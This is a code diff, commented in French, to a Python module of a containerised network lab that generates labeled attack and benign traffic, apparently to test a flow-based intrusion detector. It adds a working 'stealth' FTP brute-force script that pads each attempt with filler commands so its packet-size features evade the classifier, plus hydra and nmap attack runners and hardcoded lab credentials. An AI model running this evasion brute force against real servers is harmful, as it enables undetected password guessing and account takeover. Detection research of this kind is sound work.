@@ -25,17 +25,22 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 from docker.errors import DockerException
+from fastapi import HTTPException
 
-from .deployer import LabManager
-from .errors import NotFoundError, UserError
-from .models import dns_name
-# Compte de démonstration des serveurs : cible des forces brutes, et compte de l'agent bénin.
-from .service_listener import DOMAIN, LAB_PASSWORD, LAB_USER
+from .lab import LabManager
 from .settings import PREFIX
 
 log = logging.getLogger(__name__)
 
 AGENT_SOURCE = (Path(__file__).parent / "traffic_agent.py").read_text(encoding="utf-8")
+
+# Compte de démonstration des serveurs (créé dans docker/server/Dockerfile) :
+# cible des forces brutes, et compte utilisé par l'agent bénin.
+LAB_USER = "labuser"
+LAB_PASSWORD = "password123"
+
+# Types de trafic bénin (voir traffic_agent.py) : le ping, et les trois services d'un serveur.
+BENIGN_KINDS = ("icmp", "http", "ssh", "ftp")
 
 # Cible acceptée : une adresse IPv4 ou un sous-réseau. S'y limiter empêche toute
 # injection quand la cible est insérée dans une commande shell (force brute hydra).
@@ -91,28 +96,54 @@ def _hydra_cmd(service):
 
 
 # Force brute FTP « furtive » (évasion par mimétisme, inspirée d'Okada et al.).
-# Le modèle décide par flux : la temporisation seule ne l'évade pas, car elle ne
-# change pas la forme d'un flux. Ici on change la forme : au lieu de hydra (dont la
-# micro-structure des logins ratés a été apprise comme « ftp-patator »), on utilise
-# le MÊME client que l'agent bénin (ftplib) à la MÊME cadence humaine. Chaque essai
-# raté produit alors un flux quasi identique à un login raté légitime, et le modèle
-# ne sait plus le distinguer du bénin.
+#
+# Le modèle décide PAR FLUX, et ce qui trahit une force brute n'est ni le client ni le
+# rythme entre tentatives, mais la FORME du flux : un login raté est un flux pauvre
+# (peu de paquets, peu d'octets, peu de drapeaux PSH, long à cause du délai anti-force-
+# brute du serveur), là où une vraie session bénigne est riche (beaucoup d'allers-retours
+# de commandes). Le modèle a appris « flux FTP pauvre = attaque ».
+#
+# L'évasion (Okada, « XAI-driven » : perturber précisément les features que le modèle
+# utilise vers la zone bénigne). Les features décisives du modèle sont des TAILLES de paquet
+# (Packet Length Mean/Std, Average Packet Size, Flow Bytes/s) : un login raté est un flux
+# minuscule (quelques octets), une session bénigne échange de vrais octets. On étoffe donc
+# chaque tentative avec de vraies commandes FTP, dont certaines portent une grande ligne
+# d'arguments (plusieurs centaines d'octets) et d'autres (HELP, FEAT) reçoivent une réponse
+# longue : la taille moyenne des paquets et le débit du flux montent dans la zone bénigne.
+# Le modèle par flux ne le distingue plus d'une session normale. On garde le même client que
+# l'agent bénin (ftplib) et une cadence humaine entre les tentatives.
 _FTP_STEALTH = r'''
 import ftplib, random, sys, time
 TARGET = sys.argv[1]
 USER = %USER%
 WORDLIST = %WORDLIST%
 REMOTE = ["notes.txt", "data/ventes.csv", "data/rapport.pdf", "backup/archive.tar.gz"]
+FILLER = "la session consulte le catalogue et verifie les fichiers du serveur " * 8  # ~530 octets
 rng = random.Random()
 def think(a, b): time.sleep(rng.uniform(a, b))
+def pad(ftp, n):
+    # Mélange de commandes : les unes portent une grosse ligne d'arguments (octets ALLER),
+    # les autres reçoivent une réponse longue (octets RETOUR). Le serveur répond à tout.
+    for _ in range(n):
+        if rng.random() < 0.6:
+            cmd = "NOOP " + FILLER[:rng.randint(120, 500)]   # grosse ligne vers le serveur
+        else:
+            cmd = rng.choice(["HELP", "FEAT", "STAT", "HELP SITE"])  # grosse réponse du serveur
+        try:
+            ftp.putline(cmd)         # envoie la ligne
+            ftp.getmultiline()       # lit la réponse (sans lever sur un code d'erreur)
+        except Exception: pass
+        time.sleep(rng.uniform(0.05, 0.3))  # cadence "frappe au clavier", comme une session
 def attempt(pw):
     ftp = ftplib.FTP()
     try:
         ftp.connect(TARGET, 21, timeout=10)
+        pad(ftp, rng.randint(6, 10))     # etoffe le flux AVANT l'essai : forme d'une session
         try:
             ftp.login(USER, pw)
         except ftplib.error_perm:
-            return False  # login rate : flux identique au "typo" de l'agent benin
+            pad(ftp, rng.randint(4, 8))  # encore des commandes apres l'echec
+            return False
         try:
             ftp.retrlines("LIST", lambda _l: None)
             for _ in range(rng.randint(1, 3)):
@@ -128,11 +159,17 @@ def attempt(pw):
     finally:
         try: ftp.close()
         except Exception: pass
+found = None
 for pw in WORDLIST:
     if attempt(pw):
+        found = pw
         break
     think(1.0, 4.0)  # cadence humaine, pas une rafale hydra
-print("ftp-stealth done")
+# Verdict lu par le backend (attack_result) pour afficher si l'attaque a abouti.
+if found:
+    print("RESULTAT: OK", USER, found)
+else:
+    print("RESULTAT: FAIL")
 '''
 
 
@@ -184,8 +221,9 @@ ATTACKS = {
     },
     "ftp-bruteforce-stealth": {
         "name": "Force brute FTP (furtive, évasion)", "needs": "ip", "tool": "python-ftp", "service": "ftp",
-        "description": ("Force brute FTP qui imite le client bénin (ftplib) et sa cadence humaine : "
-                        "chaque essai ressemble à un login raté légitime (évasion inspirée d'Okada)."),
+        "description": ("Force brute FTP qui donne à chaque essai la forme d'une session bénigne "
+                        "(client ftplib, commandes de remplissage, cadence humaine) : le modèle par flux "
+                        "ne la distingue plus du trafic normal (évasion inspirée d'Okada)."),
         "label": ("force-brute", "ftp-patator-stealth"), "command": _ftp_stealth_cmd,
     },
 }
@@ -213,6 +251,41 @@ def speed_catalog():
     return [{"id": k, "label": v["label"]} for k, v in SPEEDS.items()]
 
 
+def attack_result(attack, logs):
+    """Verdict « l'attaque a-t-elle abouti ? » lu dans la sortie de l'outil.
+
+    Indépendant de la détection : une attaque peut réussir tout en étant furtive.
+    Renvoie {ok: bool, text: str}, ou None si on ne peut pas conclure.
+    """
+    if not logs or not attack:
+        return None
+    tool = attack.get("tool")
+    subcategory = attack["label"][1] if "label" in attack else ""
+
+    if tool == "hydra":  # force brute SSH / FTP : hydra imprime les identifiants trouvés
+        m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", logs)
+        if m:
+            return {"ok": True, "text": f"mot de passe trouvé : {m.group(1)} / {m.group(2)}"}
+        return {"ok": False, "text": "aucun mot de passe trouvé"}
+    if tool == "python-ftp":  # force brute furtive : verdict imprimé par le script
+        m = re.search(r"RESULTAT:\s*OK\s+(\S+)\s+(\S+)", logs)
+        if m:
+            return {"ok": True, "text": f"mot de passe trouvé : {m.group(1)} / {m.group(2)}"}
+        if "RESULTAT: FAIL" in logs:
+            return {"ok": False, "text": "aucun mot de passe trouvé"}
+        return None
+    if tool == "nmap":
+        if subcategory == "ping-sweep":  # balayage de découverte : machines actives
+            hosts = len(re.findall(r"Host is up", logs))
+            return {"ok": hosts > 0, "text": f"{hosts} machine(s) active(s)"}
+        # scans de ports : les ports ouverts trouvés (ou aucun)
+        ports = re.findall(r"^(\d+)/tcp\s+open", logs, re.M)
+        if ports:
+            return {"ok": True, "text": "ports ouverts : " + ", ".join(ports)}
+        return {"ok": False, "text": "aucun port ouvert"}
+    return None
+
+
 def docker_time(value):
     """Horodatage Docker (« 2026-10-30T10:49:59.123456789Z ») → secondes epoch ; None si absent."""
     if not value or value.startswith("0001-"):
@@ -234,14 +307,15 @@ class TrafficManager:
     # ------------------------------------------------------------------ petits utilitaires
 
     def require_device(self, node_id, what):
-        """Conteneur allumé d'un équipement, ou UserError si éteint."""
+        """Conteneur allumé d'un équipement, ou erreur HTTP 409 si éteint."""
         device = self.lab.find_device(node_id)
         if device is None or device.status != "running":
-            raise UserError(f"{what} : l'équipement est éteint (validez la topologie pour démarrer le réseau).")
+            raise HTTPException(409, f"{what} : l'équipement est éteint (démarrez le réseau).")
         return device
 
     def name_of(self, container):
-        return container.labels.get(f"{PREFIX}.name", "?")
+        """Nom affiché d'un équipement : son hostname (« PC-1 »), fixé dans le docker-compose.yml."""
+        return container.attrs["Config"]["Hostname"]
 
     def device_ip(self, container):
         """Première adresse IP du conteneur (pour étiqueter les flux)."""
@@ -275,8 +349,8 @@ class TrafficManager:
     # ------------------------------------------------------------------ trafic bénin
 
     def start_benign(self, node_id, profile, targets, dest="all", kinds=None):
-        """(Re)lance l'agent bénin sur un PC (un seul par équipement). `dest` est un
-        libellé d'affichage ; `kinds` liste les types de trafic (voir traffic_agent.py)."""
+        """(Re)lance l'agent bénin sur un PC (un seul par équipement). `targets` : [{ ip, server }] ;
+        `dest` est un libellé d'affichage ; `kinds` liste les types de trafic (voir traffic_agent.py)."""
         device = self.require_device(node_id, "Trafic de fond")
         self.stop_benign(node_id)
         self._paused.pop(node_id, None)
@@ -284,9 +358,8 @@ class TrafficManager:
         config = {
             "profile": profile,
             "kinds": kinds or ["icmp"],
-            "targets": [{**t, "host": dns_name(t["name"])} for t in targets],
+            "targets": targets,
             "account": {"user": LAB_USER, "password": LAB_PASSWORD},
-            "domain": DOMAIN,
         }
         command = ["python3", "-u", "-c", AGENT_SOURCE, json.dumps(config)]
         self.lab.start_netns_helper(device, command, role="traffic",
@@ -313,7 +386,7 @@ class TrafficManager:
         """Lance une attaque depuis `source_id` vers `target` (IP ou sous-réseau), une fois."""
         target = (target or "").strip()
         if not TARGET_RE.match(target):
-            raise UserError("Cible invalide : attendez une adresse IP ou un sous-réseau (ex. 10.0.20.10).")
+            raise HTTPException(400, "Cible invalide : attendez une adresse IP ou un sous-réseau (ex. 10.0.20.10).")
         device = self.require_device(source_id, "Scénario")
         attack = ATTACKS[attack_id]
         category, subcategory = attack["label"]
@@ -334,7 +407,7 @@ class TrafficManager:
         for helper in self.lab.helpers("scenario"):
             if helper.id.startswith(scenario_id):
                 return helper.logs().decode(errors="replace")
-        raise NotFoundError("Scénario introuvable (le réseau a peut-être été arrêté).")
+        raise HTTPException(404, "Scénario introuvable (le réseau a peut-être été arrêté).")
 
     def list_scenarios(self):
         scenarios = [self._scenario_info(h) for h in self.lab.helpers("scenario")]
@@ -447,6 +520,16 @@ class TrafficManager:
         speed = labels.get(f"{PREFIX}.speed", DEFAULT_SPEED)
         target = labels.get(f"{PREFIX}.target", "")
         scenario_id = helper.id[:12]
+        status = "stopped" if helper.status != "running" and scenario_id in self._stopped else helper.status
+
+        # Verdict de l'attaque (a-t-elle abouti ?), lu dans la sortie une fois terminée.
+        result = None
+        if status != "running":
+            try:
+                result = attack_result(attack, helper.logs().decode(errors="replace"))
+            except DockerException:
+                pass
+
         return {
             "id": scenario_id,
             "attack": attack_id,
@@ -460,6 +543,7 @@ class TrafficManager:
             "subcategory": labels.get(f"{PREFIX}.subcategory", ""),
             "started": int(labels.get(f"{PREFIX}.started", "0") or 0),
             # running | exited | stopped (interrompu depuis l'interface)
-            "status": "stopped" if helper.status != "running" and scenario_id in self._stopped else helper.status,
+            "status": status,
             "exitCode": exit_code,
+            "result": result,  # {ok, text} ou null
         }
